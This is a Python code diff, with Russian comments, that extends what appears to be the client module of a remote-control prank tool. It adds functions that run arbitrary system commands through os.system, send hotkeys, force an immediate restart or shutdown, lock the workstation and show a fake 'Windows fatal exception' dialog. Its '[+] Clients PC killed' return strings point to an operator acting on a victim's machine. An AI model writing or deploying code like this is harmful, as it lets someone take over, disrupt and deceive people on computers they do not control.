@@ -1,5 +1,7 @@
 import os
 import wget
+import pyautogui
+import ctypes
 
 
 def screamer():
@@ -17,3 +19,34 @@ def screamer():
         return "невозможно открыть файл скримера"
     return "Скример сработал)"
 
+def hotkey(keys):
+    """активирует хоткей"""
+    try:
+        pyautogui.hotkey(keys)
+        return "хоткей сработал"
+    except Exception as err:
+        print(err)
+        return "неправильный хоткей"
+
+def sys_command(command):
+    """Использует стандартную сиситемную комманду, например peppa.mp4 откроется в видеопроигрователе"""
+    # переводит массив слов в строку с коммандой
+    command = ' '.join(command)
+    os.system(command)
+
+def restart_pc():
+    os.system("shutdown /r /t 1")
+    return "[+] Clients PC restarted"
+
+def shutdown_pc():
+    os.system("shutdown /s /t 1")
+    return "[+] Clients PC killed"
+
+def lock_pc():
+    ctypes.windll.user32.LockWorkStation()
+    return "[+] Clients PC locked"
+
+def message(text):
+    text = ' '.join(text)
+    ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
+    return "[+] Message received by client"
